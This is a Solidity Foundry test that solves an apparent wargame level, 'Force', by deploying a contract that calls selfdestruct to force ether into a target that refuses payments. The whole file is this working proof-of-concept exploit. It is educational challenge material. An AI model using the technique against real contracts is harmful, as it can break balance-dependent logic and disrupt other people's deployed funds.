// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Force} from "../src/07_Force.sol";

contract Bomb{
     function explotar(address payable _victima) public { 
          selfdestruct(_victima);
     }
}
contract ForceTest is Test {
    Force public fc;
    Bomb public bm;

    address public hacker = address(0x1337); 
    
    function setUp() public {
        fc = new Force();
        bm = new Bomb();
        vm.deal(address(bm), 10 ether); 
    }

    function testExploit() public {
        vm.startPrank(hacker);
        console.log("initial balance", address(fc).balance);
        bm.explotar(payable(address(fc)));
        console.log("final balance", address(fc).balance);
        assertGt(address(fc).balance, 0);
        vm.stopPrank();
    }
}